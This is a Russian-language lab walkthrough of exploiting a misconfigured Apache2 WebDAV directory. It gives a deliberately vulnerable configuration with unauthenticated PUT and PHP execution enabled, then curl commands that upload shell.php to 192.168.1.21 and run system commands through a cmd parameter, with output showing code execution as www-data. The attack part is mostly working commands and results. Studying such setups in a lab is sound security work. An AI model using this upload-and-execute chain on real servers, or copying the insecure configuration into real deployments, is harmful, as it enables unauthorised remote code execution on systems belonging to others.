Уязвимость эксплуатирует архитектурные недостатки конфигурации разграничения прав доступа и политик исполнения серверных сценариев в модуле WebDAV
Вектор атаки не требует обхода программных уязвимостей или подбора учетных данных
Атака направлена на несанкционированную запись произвольных файлов в корневую директорию веб-сервера с последующей инициацией их интерпретации серверным движком PHP
Нарушитель использует стандартный HTTP-метод PUT, предназначенный для загрузки объектов, отправляя исполняемый сценарий в зону, доступную для веб-интерпретатора
При отсутствии жесткого разграничения директив выполнения веб-сервер обрабатывает загруженный файл как легиватную программную логику
В результате нарушитель получает возможность выполнять произвольные системные команды в контексте учетной записи, от имени которой запущен сетевой демон www-data


Использование стандартных параметров веб-сервера Apache2 с активированными модулями dav и dav_fs, отсутствие механизмов аутентификации для метода PUT в целевом каталоге, а также избыточные права файловой системы
Моделирование уязвимой среды обеспечивается внесением следующих параметров в конфигурационный файл /etc/apache2/sites-available/000-default.conf:
Alias /webdav /var/www/html/webdav
<Directory /var/www/html/webdav>
    DAV On
    Require all granted
    php_admin_flag engine on
</Directory>


При помощи запроса можно подтвердить отклик WebDAV-интерфейса и доступность целевого каталога:
curl -I -s http://192.168.1.21/webdav/ | grep HTTP
Результат: HTTP/1.1 200 OK

С атакующей машины инициируется загрузка вредоносного исполняемого сценария методом PUT с передачей тела в бинарном режиме:
curl -X PUT --data-binary @shell.php http://192.168.1.21/webdav/shell.php
Результат: HTTP/1.1 201 Created

Выполняется попытка удаленного выполнения кода путем обращения к созданному дескриптору через HTTP GET-запрос с передачей системной команды в качестве аргумента:
curl -s "http://192.168.1.21/webdav/shell.php?cmd=id;+uname+-a"
Результат: Вывод идентификаторов текущего пользователя системы (uid=33(www-data) gid=33(www-data) groups=33(www-data)) и параметров ядра ОС жертвы, подтверждающий успешный перехват управления
